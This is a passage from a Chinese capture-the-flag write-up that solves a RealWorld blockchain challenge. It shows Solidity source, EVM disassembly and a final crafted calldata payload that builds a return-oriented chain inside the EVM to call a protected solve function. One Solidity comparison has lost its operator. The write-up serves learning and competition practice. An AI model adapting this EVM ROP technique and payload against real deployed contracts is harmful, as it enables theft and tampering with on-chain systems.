        uint256 c;
        uint256 d;
        uint256 e;
        uint256 f;
        uint256 g;
        uint256 h;
        uint256 i;
        function monica_init(uint256 _a, uint256 _b, uint256 _c, uint256 _d, uint256 _e, uint256 _f, uint256 _g, uint256 _h, uint256 _i) public {
            a=_a;
            b=_b;
            c=_c;
            d=_d;
            e=_e;
            f=_f;
            g=_g;
            h=_h;
            i=_i;
        }
        function loose() view public returns(bool){
            uint256 t1 = (a^b^c)+(d^e^f)+(g^h^i);
            uint256 t2 = (a+d+g)^(b+e+h)^(c+f+i);
            require(t1 + t2  0x8261e26b90505061031256e5afb60721cb);
            require(0xf35b6080614321368282376084810151606401816080016143855161051756 >= t1*t2);
            require(t1 - t2 >= 0x65e670d9bd540cea22fdab97e36840e2);
            return true;
        }
        function harsh(bytes memory seed, string memory info) public{
            require(loose());
            if (keccak256(seed) == bytes32(bytes18(0x6111d850336107ef16565b908018915a9056))) {
                server.solve(info);
            }
        }
    }
很幸运的是，我们发现恰好可以此处比较的逻辑：`20012010 1561049a 57600080 90549061` 修改为 `a0012010
9561049a 57600080 90549061`，可以发现合约的字节码有了如下变化：
尝试调用修改后的合约，在通过了 `loose()` 的校验后，我们发现由于栈空间不够长的原因，`SWAP6` 找不到对应的元素，合约依旧会执行失败：
因此我们需要继续修改，可以看到 `loose()` 函数中的两处比较的 PUSH 指令均可以修改，而且修改完后的效果非常令人惊喜，均带有跳转到不同位置的
`JUMP` 指令，而且对应位置的指令恰好是 `JUMPDEST`，很难不怀疑这里是出题人特意为我们构造好的指令。
修改之后继续调试，发现此时调用 `harsh(0x00, "syang solve")` 会在如下图所示的 JUMP 处停止，原因是栈上的地址不对，EVM
会由于跳到错误的地址而 revert，所以下一步的目标就是思考如何在栈上放入一个我们想要的跳转地址，结合之前的修改，我们需要跳到的位置应该是
0x373，恰好是离 `SWAP6` 指令最近的一个 `JUMPDEST`。
    ......
    [751] JUMPDEST
    [752] CREATE
    [753] DUP3
    [756] PUSH2 0xe2eb
    [757] SWAP1
    [758] POP
    [759] POP
    [762] PUSH2 0x0312
    [763] JUMP
    ......
    [786] JUMPDEST
    [788] PUSH1 0x00
    [791] PUSH2 0x4321
    [792] CALLDATASIZE
    [793] DUP3
    [794] DUP3
    [795] CALLDATACOPY
    [797] PUSH1 0x84
    [798] DUP2
    [799] ADD
    [800] MLOAD
    [802] PUSH1 0x64
    [803] ADD
    [804] DUP2
    [806] PUSH1 0x80
    [807] ADD
    [810] PUSH2 0x4385
    [811] MLOAD
    [814] PUSH2 0x0517
    [815] JUMP
    ......
    [1178] JUMPDEST
    [1179] POP
    [1180] POP
    [1181] JUMP
    ......
    [1303] JUMPDEST
    [1305] PUSH1 0x02
    [1306] JUMPDEST
    [1307] DUP1
    [1309] PUSH1 0x05
    [1310] EQ
    [1313] PUSH2 0x049a
    [1314] JUMPI
    [1315] DUP2
    [1316] DUP2
    [1318] PUSH1 0x04
    [1319] '1b'(Unknown Opcode)
    [1320] '1c'(Unknown Opcode)
    [1323] PUSH2 0xffff
    [1324] AND
    [1325] SWAP2
    [1326] SWAP1
    [1328] PUSH1 0x01
    [1329] ADD
    [1332] PUSH2 0x051a
    [1333] JUMP
    ......
通过分析代码可以很明显地发现，跳转的地址来自 `CALLDATACOPY` 复制的我们在函数调用时传入的 data，根据循环迭代的次数可以推断哪四位 bit
是真正用于跳转的地址，这里直接传入 seed =
0x404142434445464748494a4b4c4d4e4f505152535455037358595a5b5c5d5e5f，调用，再次发现执行失败，通过调试可以发现本次的失败原因是函数调用完成后需要回到正常的地址，但由于此时的栈顶是
0x43a1，一个在之前执行过程中被压入的值，而且这个值是我们不可控的，所以这种思路同样出现了问题：
暂时的思路出现了问题，这里去参考了 0ops 的解法：tx:
0xa89fdd83493faf35a3970eb6c6c7d787dddf11151887c427361b2a916e8cfcf6@rinkeby
可以看到他们把第三处比较也进行了修改：
修改完后可以看到，不同于上一处 `CALL` 指令，这里的 `CALL` 指令后面跟着的 `JUMP` 指令跳转的地址是通过 `CALLER &
0x07ef` 得到的，而 `CALLER` 是调用者的地址，是我们可控的，只要我们通过爆破得到一个结尾为 01c3 的地址，函数执行完就会跳转到
`[451] JUMPDEST [452] STOP`，顺利结束本次调用。
重新整理一下思路，如果我们希望通过 ROP 调用此处 `CALL` 执行，那么我们需要在栈上依次构造好 `gas addr value argsOffset
argsLength retOffset retLength`，继续研究 bytecode，可以看到下面这一段代码恰好压入了
`GAS`，而且会跳转到栈上的地址：
    ...
    [895] JUMPDEST
    [896] SWAP1
    [897] DUP1
    [898] XOR
    [899] SWAP2
    [900] GAS
    [901] SWAP1
    [902] JUMP
    ...
接下来的任务则是在栈上压入需要调用合约的地址，由于合约的地址存储在 STORAGE 里，所以需要关注 `SLOAD`
指令，发现以下指令恰好满足要求，会向栈上依次压入 `0x00(value)`，`STORAGE[0x00](addr)`，且跳转到的地址同样来自栈上：
    ...
    [1182] JUMPDEST
    [1184] PUSH1 0x00
    [1185] DUP1
    [1186] SWAP1
    [1187] SLOAD
    [1188] SWAP1
    [1191] PUSH2 0x0100
    [1192] EXP
    [1193] SWAP1
    [1194] DIV
    [1215] PUSH20 0xffffffffffffffffffffffffffffffffffffffff
    [1216] AND
    [1217] DUP2
    [1218] JUMP
    ...
再结合我们之前调试过程中看到的 `0x43a1`，可以知道此次调用的 data 从 `MEMORY[0x43a1:]` 开始，而
`MEMORY[0x4321:]` 开始的数据来自我们本次调用传入的 data，因此我们需要在本次调用的第 128 位开始构造出
`solve(string)` 的函数选择器 `76fe1e92`。最后构造出来的 payload 如下，构造好地址满足特定后缀 01c3
的账户，发起交易:
    0x4059e88700000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465111168696a6b6c6d6e6f707172737475 // 前面的任意构造，补足长度
    049e // 第一次跳转地址，压入 addr 和 value
    037f // 第二次跳转地址，压入 gas
    0373 // 第三次跳转地址，调用 CALL
    76fe1e92 // call 的 data
    00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
调试到这里才发现，最初对 `ISZERO` 到 `SWAP6` 的修改反而是没必要的，只需要改动 6 个 bit，然后构造好传入的 data 实现 EVM
内部的 ROP 即可成功完成本题。不得不说本题非常地有出题人的风格，在第二届 RealWorld Montagy 的考点上结合了第一届 RealWorld
EVM ROP，精心构造出了这样一道题目，TQL。
## 参考
  * [Uniswap V2: Everything New with the Decentralised Exchange](https://rossbulat.medium.com/uniswap-v2-everything-new-with-the-decentralised-exchange-52b4bb2093ab)
  * [基于UniswapV2闪电贷的OneSwap套利指南](https://juejin.cn/post/6878116429590167565)
  * [第三届realworld 区块链wp](https://hitcxy.com/2021/rw2021/)
  * [TEA系列算法101](https://www.anquanke.com/post/id/224198)
  * [A CRYPTANALYSIS OF THE TINY ENCRYPTION ALGORITHM](https://www.tayloredge.com/reference/Mathematics/VRAndem.pdf)